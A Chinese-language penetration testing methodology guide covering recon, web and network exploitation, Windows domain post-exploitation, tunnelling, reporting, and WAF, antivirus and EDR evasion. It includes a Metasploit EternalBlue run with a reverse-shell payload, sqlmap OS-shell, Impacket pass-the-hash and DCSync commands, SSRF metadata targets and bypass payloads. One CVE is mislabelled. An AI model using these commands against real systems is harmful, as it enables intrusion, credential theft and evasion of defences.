# 渗透测试方法论

> 方法论是渗透测试的系统化框架，确保测试的全面性、可重复性和规范性。

---

## 一、渗透测试标准与框架

### 1.1 PTES（渗透测试执行标准）

PTES 是渗透测试领域最完整的标准框架，包含七个阶段：

#### 阶段一：前交互（Pre-engagement Interactions）
**核心活动**
- 确定测试目标：系统范围、网络范围、应用范围
- 确定测试类型：黑盒/白盒/灰盒
- 确定测试窗口：时间限制、频率限制
- 授权文件：书面授权书、测试范围确认书
- 法律边界：禁止行为清单、紧急联系人
- 交付物约定：报告格式、交付时间

**关键文档模板**
```
渗透测试授权书
├── 委托方信息
├── 测试范围（IP/域名/应用列表）
├── 测试类型（黑盒/白盒/灰盒）
├── 测试时间（起止时间）
├── 禁止行为（DoS攻击、数据修改等）
├── 紧急联系人
├── 授权签字
└── 法律责任声明
```

#### 阶段二：信息收集（Intelligence Gathering）

**被动信息收集**
- DNS 信息：域名注册信息、子域名、DNS 记录
- 网络信息：IP 段、ASN、CDN
- 人员信息：员工名单、邮箱格式、社交媒体
- 技术信息：技术栈、第三方服务、开源项目

**主动信息收集**
- 主机存活探测
- 端口扫描与服务识别
- Web 应用目录与文件扫描
- 指纹识别

#### 阶段三：威胁建模（Threat Modeling）
- 资产识别
- 攻击者画像
- 攻击向量分析
- 攻击树构建
- 风险评级

#### 阶段四：漏洞分析（Vulnerability Analysis）
- 自动化扫描：Nessus、OpenVAS
- 手动验证
- 漏洞分类与优先级排序
- 漏洞链分析

#### 阶段五：漏洞利用（Exploitation）
- 漏洞利用验证
- Payload 定制
- 绕过防御
- 获取初始 foothold

#### 阶段六：后渗透（Post Exploitation）
- 权限提升
- 横向移动
- 数据获取
- 持久化
- 痕迹清理

#### 阶段七：报告（Reporting）
- 执行摘要（管理层视角）
- 技术报告（技术团队视角）
- 修复建议
- 复测计划

### 1.2 OWASP 测试指南

**OWASP WSTG（Web Security Testing Guide）**

OWASP WSTG 提供了 Web 应用渗透测试的系统化方法论：

**测试分类**
- 信息收集与侦察
- 配置与部署管理测试
- 身份认证测试
- 会话管理测试
- 授权测试
- 输入验证测试
- 业务逻辑测试
- 客户端测试
- API 测试

### 1.3 NIST SP 800-115

**NIST 技术指南核心流程**
1. 规划阶段：确定范围、规则、授权
2. 发现阶段：信息收集、漏洞扫描
3. 攻击阶段：漏洞利用、后渗透
4. 报告阶段：结果分析、报告编写

## 二、信息收集方法论

### 2.1 被动信息收集

#### 2.1.1 域名与 DNS 信息

**子域名收集策略**

多维度子域名收集：
```
1. DNS 枚举
   - dig 基本查询
   - fierce 碰撞检测
   - sublist3r 搜索引擎枚举
   - amass 深度收集

2. 证书透明日志
   - crt.sh 查询
   - Censys 查询
   - Google CT 搜索

3. 搜索引擎
   - Google Dork: site:example.com
   - Bing: site:example.com
   - Shodan: hostname:example.com

4. 代码仓库
   - GitHub Code Search
   - Gitee 搜索
   - GitLab 搜索

5. 字典爆破
   - subbrute
   - 字典优化策略
   - 泛解析检测
```

**DNS 记录分析**
- A 记录：域名到 IP
- CNAME 记录：别名记录
- MX 记录：邮件服务器
- TXT 记录：验证信息、SPF
- NS 记录：DNS 服务器
- SOA 记录：区域起始

#### 2.1.2 IP 与网络信息

**IP 段发现**
- BGP 查询：通过 BGP 路由表确定 IP 段
- WHOIS 查询：注册信息
- 反查 IP 上的其他域名
- CDN 识别：多地 ping、CNAME 指向 CDN

**Shodan/Fofa/ZoomEye 搜索**
- Shodan：按设备、服务、端口搜索
- Fofa：按 IP、域名、证书搜索
- ZoomEye：按组件、设备搜索
- 搜索语法优化

#### 2.1.3 人员信息收集

**OSINT 人员信息收集**
- LinkedIn / 脉脉：公司员工列表
- GitHub：员工代码仓库、泄露凭据
- 社交媒体：Facebook/Twitter/微博
- theHarvester：邮箱与子域名收集
- Hunter.io：邮箱格式发现

### 2.2 主动信息收集

#### 2.2.1 端口扫描策略

**Nmap 扫描策略**
```
# 快速发现
nmap -sn 10.0.0.0/24          # 主机发现
nmap -sS -T4 10.0.0.0/24       # SYN 快速扫描

# 精确扫描
nmap -sS -sV -O -A -T4 10.0.0.0/24   # 全功能扫描
nmap -sS -p- 10.0.0.10              # 全端口扫描
nmap -sU 10.0.0.10                  # UDP 扫描

# 防火墙绕过
nmap -f 10.0.0.10                   # 分片扫描
nmap --scan-delay 1s 10.0.0.10      # 延迟扫描
nmap --source-port 53 10.0.0.10     # 源端口欺骗
nmap --data-length 30 10.0.0.10     # 随机数据填充
```

**Masscan 大规模扫描**
```
masscan 10.0.0.0/24 -p1-65535 --rate=10000
```

#### 2.2.2 Web 应用信息收集

**目录扫描**
```bash
# dirsearch
python3 dirsearch.py -u https://target.com -e php,asp,jsp,html,js

# feroxbuster
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

**指纹识别**
- CMS 识别：whatweb、Wappalyzer、CMSeek
- 框架识别：响应头、Cookie 名称、特征文件
- CDN 识别：多地 Ping、CNAME 分析
- WAF 识别：wafw00f、手工 Payload 测试

**Google Dork 常用语法**
```
site:target.com                      # 限定域名
site:target.com filetype:pdf         # 指定文件类型
site:target.com inurl:admin          # URL 包含 admin
site:target.com intitle:"index of"   # 目录列出
site:target.com inurl:.git           # Git 仓库泄露
site:target.com intext:"password"    # 页面含 password
```

## 三、漏洞利用方法论

### 3.1 Web 漏洞利用

#### 3.1.1 SQL 注入利用流程

**检测**
- 手工检测：基于错误、基于布尔、基于时间
- sqlmap 自动化：`sqlmap -u "http://target.com/page?id=1" --batch --dbs`

**利用流程**
```
1. 确定注入点与类型
2. 判断数据库类型
3. 获取数据库信息
   - sqlmap --dbs
   - sqlmap -D dbname --tables
   - sqlmap -D dbname -T tablename --dump
4. 绕过 WAF
   - sqlmap --tamper="tamper脚本"
   - 手工 Payload 变形
5. 写入 WebShell（需 DBA 权限）
   - sqlmap --os-shell
   - INTO OUTFILE
```

#### 3.1.2 XSS 利用流程

**检测**
- 反射型：输入点 → 输出点
- 存储型：输入持久化 → 输出持久化
- DOM 型：JS 执行点

**利用**
```
1. 确定 XSS 类型
2. 测试过滤规则
3. 构造绕过 Payload
4. 选择利用方式
   - Cookie 窃取
   - 键盘记录
   - XSS 平台（XSS Platform）
   - BeEF 框架
5. 处理 CSP 防护
   - JSONP 绕过
   - CDN 白名单利用
   - nonce 泄露
```

#### 3.1.3 SSRF 利用流程

**检测**
- URL 参数中包含外部 URL
- 服务器发起的网络请求

**利用链**
```
1. 探测内网
   - http://127.0.0.1:port
   - http://192.168.1.0/24
   - http://10.0.0.0/8

2. 内网服务利用
   - Redis: http://127.0.0.1:6379
   - MySQL: gopher://127.0.0.1:3306
   - FastCGI: gopher://127.0.0.1:9000

3. 云环境元数据
   - AWS: http://169.254.169.254/latest/meta-data/
   - 阿里云: http://100.100.100.200/latest/meta-data/
   - 腾讯云: http://169.254.128.23/latest/meta-data/

4. 利用协议
   - file:// 读取本地文件
   - gopher:// 发送 TCP 数据
   - dict:// 探测端口
   - ldap:// LDAP 查询
```

### 3.2 网络服务漏洞利用

#### 3.2.1 常见高危服务漏洞

**SMB 服务**
- MS17-010（永恒之蓝）：远程代码执行
- CVE-2020-0796（SMBGhost）：远程代码执行
- SMB 空会话枚举
- Share 枚举与利用

**RDP 服务**
- CVE-2019-0708（BlueKeep）：远程代码执行
- RDP 劫持：tscon 劫持
- 弱密码爆破

**SSH 服务**
- 弱密码爆破：hydra、medusa
- 密钥泄露利用
- SSH 代理转发利用
- CVE-2018-15473 用户枚举

**数据库服务**
- MySQL：弱密码、UDF 提权
- MSSQL：xp_cmdshell、SA 权限利用
- PostgreSQL：COPY FROM PROGRAM
- Redis：未授权访问、写 SSH 公钥、写计划任务、写 WebShell
- MongoDB：未授权访问
- Elasticsearch：未授权访问、脚本执行

### 3.3 Metasploit 使用方法论

#### 3.3.1 基础工作流

```bash
# 启动并创建工作区
msf6 > workspace -a target1

# 导入 nmap 结果
msf6 > db_nmap -sS -sV 10.0.0.0/24

# 搜索模块
msf6 > search type:exploit name:ms17_010

# 使用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 查看选项
msf6 exploit(...) > show options

# 设置参数
msf6 exploit(...) > set RHOSTS 10.0.0.10
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.0.0.5

# 执行
msf6 exploit(...) > exploit
```

## 四、后渗透方法论

### 4.1 权限提升

#### 4.1.1 Windows 提权方法论

**系统化提权流程**
```
1. 系统信息收集
   - systeminfo
   - Windows 版本与补丁
   - 使用 Windows-Exploit-Suggester 查找内核漏洞

2. 服务配置检查
   - accesschk.exe 检查服务权限
   - 查找未引用的服务路径
   - 检查服务二进制文件权限

3. 凭据收集
   - 注册表键值
   - 自动化：WinPEAS、PrivescCheck

4. UAC 绕过
   - uacmethod
   - 各种 UAC 绕过技术

5. 内核漏洞利用
   - MS16-032 / MS16-135
   - CVE-2021-1675 (PrintNightmare)
   - CVE-2022-26923 (PetitPotam)
```

#### 4.1.2 Linux 提权方法论

**系统化提权流程**
```
1. 系统信息收集
   - uname -a / cat /etc/os-release
   - 使用 linux-exploit-suggester

2. SUID 检查
   - find / -perm -4000 2>/dev/null
   - GTFOBins 查找利用方法

3. sudo 检查
   - sudo -l
   - GTFOBins 查找利用方法

4. Cron 任务检查
   - cat /etc/crontab
   - ls -la /etc/cron.*

5. 自动化
   - LinPEAS
   - LinEnum
   - linux-exploit-suggester
```

### 4.2 横向移动

#### 4.2.1 Windows 域横向移动

**横向移动决策树**
```
获取初始凭据
├── 凭据类型
│   ├── 明文密码 → Pass the Hash（需要 NTLM Hash）
│   ├── NTLM Hash → PtH（psexec/wmiexec/smbexec）
│   ├── Kerberos Ticket → PtT（Rubeus/Impacket）
│   └── AES Key → Overpass the Hash
│
├── 目标选择
│   ├── BloodHound 分析最短路径
│   ├── CrackMapExec 批量测试
│   └── BloodHound + CrackMapExec 组合
│
├── 横向技术
│   ├── PsExec (psexec.py)
│   ├── WMI (wmiexec.py)
│   ├── WinRM (evil-winrm)
│   ├── DCOM (dcomexec.py)
│   └── RDP
│
└── 凭据获取
    ├── Mimikatz (sekurlsa::logonpasswords)
    ├── LSASS dump + lsassy
    ├── Kerberoasting
    ├── AS-REP Roasting
    └── DCSync
```

#### 4.2.2 Impacket 工具使用

```bash
# 获取 Shell
impacket-psexec domain/user:password@10.0.0.10
impacket-wmiexec domain/user:password@10.0.0.10
impacket-smbexec domain/user:password@10.0.0.10

# Pass the Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# Kerberos 攻击
impacket-GetUserSPNs domain/user:password -request    # Kerberoasting
impacket-GetNPUsers domain/ -usersfile users.txt       # AS-REP Roasting
impacket-secretsdump domain/user:password@10.0.0.10   # 凭据导出

# DCSync
impacket-secretsdump domain/user:password@DC_IP -just-dc
```

### 4.3 代理与隧道

#### 4.3.1 代理方案选择

**场景分类**
```
场景1：目标出网
├── 反向 SOCKS 代理
│   ├── frp（功能全面，配置简单）
│   ├── chisel（单文件，跨平台）
│   └── Sliver / Mythic 内置代理
│
场景2：目标仅出特定端口
├── ICMP 隧道：icmpsh / iodine
├── DNS 隧道：dnscat2
└── HTTPS 代理：reGeorg / Neo-reGeorg

场景3：目标不出网
├── 正向 SOCKS 代理
│   ├── ssh -D
│   └── chisel
└── 端口转发
    └── PortForward / netsh
```

#### 4.3.2 frp 配置示例

**服务端 frps.ini**
```ini
[common]
bind_port = 7000
token = your_secret_token
```

**客户端 frpc.ini**
```ini
[common]
server_addr = 10.0.0.5
server_port = 7000
token = your_secret_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 33890
```

**使用 proxychains 连接**
```bash
# /etc/proxychains4.conf
socks5  10.0.0.5  1080

# 使用代理
proxychains nmap -sT 10.0.0.10
proxychains impacket-psexec domain/user:password@10.0.0.10
```

## 五、渗透测试报告

### 5.1 报告结构

**标准报告模板**
```
1. 封面
   - 测试项目名称
   - 委托方名称
   - 测试团队名称
   - 报告日期
   - 报告版本

2. 执行摘要
   - 测试概述
   - 关键发现（Critical/High 漏洞）
   - 风险整体评级
   - 核心修复建议（管理层视角）

3. 测试范围与方法
   - 测试对象
   - 测试类型
   - 测试时间
   - 测试方法论

4. 漏洞详情
   - 漏洞名称
   - 风险等级（CVSS 评分）
   - 漏洞描述
   - 影响范围
   - 复现步骤（含截图）
   - 修复建议
   - 参考链接

5. 附录
   - 完整漏洞列表
   - 工具使用记录
   - 测试日志
```

### 5.2 漏洞评级标准

**CVSS 3.1 评分维度**
- 攻击路径：Network/Adjacent/Local/Physical
- 攻击复杂度：Low/High
- 权限要求：None/Low/High
- 用户交互：None/Required
- 影响范围：Unchanged/Changed
- 机密性影响：None/Low/High
- 完整性影响：None/Low/High
- 可用性影响：None/Low/High

**风险等级划分**
- Critical: 9.0-10.0
- High: 7.0-8.9
- Medium: 4.0-6.9
- Low: 0.1-3.9

## 六、渗透测试最佳实践

### 6.1 安全实践准则
- 仅在授权范围内操作
- 避免对生产系统造成影响
- 测试数据保密
- 不留存后门
- 及时清理测试痕迹
- 遵守法律法规

### 6.2 测试质量管理
- 确保测试覆盖全面
- 每个漏洞需可复现
- 误报验证与排除
- 修复建议需具体可操作
- 报告经过同行评审

### 6.3 工具安全管理
- 渗透测试工具与生产环境隔离
- 工具版本定期更新
- Payload 定制避免被截获
- C2 基础设施安全加固

## 七、OWASP Testing Guide v4.2 详解

### 7.1 OWASP WSTG 分类体系

OWASP Web Security Testing Guide v4.2 将测试分为以下类别：

```
WSTG 分类（OTG = OWASP Testing Guide）：

OTG-INFO: 信息收集与侦察
  OTG-INFO-01: 搜索引擎信息收集
  OTG-INFO-02: Web 服务器指纹识别
  OTG-INFO-03: 应用程序技术栈识别
  OTG-INFO-04: 错误页面分析
  OTG-INFO-05: 应用入口点映射
  OTG-INFO-06: 应用执行路径映射
  OTG-INFO-07: 应用架构映射
  OTG-INFO-08: 指纹识别 Web 应用框架
  OTG-INFO-09: 指纹识别 Web 应用程序
  OTG-INFO-10: 测试 Google Hacking

OTG-CONF: 配置与部署管理测试
  OTG-CONF-01: 网络基础设施配置
  OTG-CONF-02: 应用平台配置
  OTG-CONF-03: 文件扩展名处理
  OTG-CONF-04: 旧备份和引用文件
```

## 十一、常见 Bypass 技巧

### 11.1 WAF 绕过

```
SQL 注入 WAF 绕过：

1. 大小写混合：
   UnIoN SeLeCt → UNION SELECT

2. 编码绕过：
   URL 编码：%55NION
   双重 URL 编码：%2555NION
   Unicode 编码：\u0055NION
   Hex 编码：0x554E494F4E

3. 注释绕过：
   /*!50000UNION*/ SELECT
   UN/**/ION SE/**/LECT

4. 空格替代：
   %09(TAB) %0a(LF) %0d(CR) %0c(FF)
   /**/ () +—

5. 关键字替代：
   UNION → UNION ALL
   SELECT → SELECT%0a
   AND → && 或 %26%26
   OR → || 或 %7C%7C

6. 函数替代：
   SUBSTRING → MID / SUBSTR
   ASCII → ORD
   CONCAT → CONCAT_WS / GROUP_CONCAT

XSS WAF 绕过：

1. 标签替代：
   <script> → <svg onload> <img onerror> <body onload>
   <a href="javascript:"> → <a href="ja%76ascript:">

2. 事件替代：
   onclick → onfocus onmouseover ontoggle

3. 编码绕过：
   <script>alert(1)</script>
   → <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
   → <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### 11.2 AV 绕过

```
AV（杀毒软件）绕过技术：

1. 编码混淆：
   - Shellcode 编码（Shikata Ga Nai）
   - XOR 编码
   - Base64 编码

2. 分离免杀：
   - Shellcode 与加载器分离
   - 从远程下载 Shellcode
   - 使用进程注入

3. 白名单利用：
   - 使用签名工具（如 sigthief）
   - 利用微软签名二进制（LOLBins）
   - 使用 certutil、bitsadmin 等

4. 内存加载：
   - 反射 DLL 注入
   - Shellcode 直接内存执行
   - AMSI Bypass

5. 工具免杀：
   - Veil Framework
   - Shellter
   - Avet
   - 自定义加载器
```

### 11.3 EDR 绕过

```
EDR（终端检测与响应）绕过技术：

1. API 直接调用：
   - Direct System Calls（直接系统调用）
   - Nt/Zw API 调用
   - 绕过用户态 Hook

2. 进程注入变体：
   - Process Hollowing（进程镂空）
   - Process Doppelgänging
   - Process Herpaderping

3. 驱动级操作：
   - 加载内核驱动
   - 直接操作 EDR 驱动

4. 间接执行：
   - 通过 COM 对象执行
   - 利用计划任务
   - 利用 WMI

5. 禁用/绕过 EDR：
   - 修改 EDR 注册表项
   - 停止 EDR 服务
   - 利用 EDR 漏洞
```

## 十四、紫队评估

### 14.1 紫队概念

```
紫队（Purple Teaming）是红队（攻击）和蓝队（防御）的协作模式：

红队（攻击方）：
  - 模拟真实攻击者
  - 执行攻击链
  - 发现安全漏洞

蓝队（防御方）：
  - 监控和检测
  - 事件响应
  - 安全加固

紫队（协作）：
  - 红蓝协同测试
  - 攻击→检测→改进→再攻击
  - 闭环持续改进

紫队评估流程：
1. 确定测试场景（如：钓鱼→初始访问→横向移动→数据外泄）
2. 红队执行攻击
3. 蓝队尝试检测和响应
4. 评估检测结果
5. 识别检测盲区
6. 优化检测规则
7. 重复测试验证改进效果

紫队评估输出：
- 攻击路径映射
- 检测覆盖率评估
- 检测规则优化建议
- 安全加固建议
```
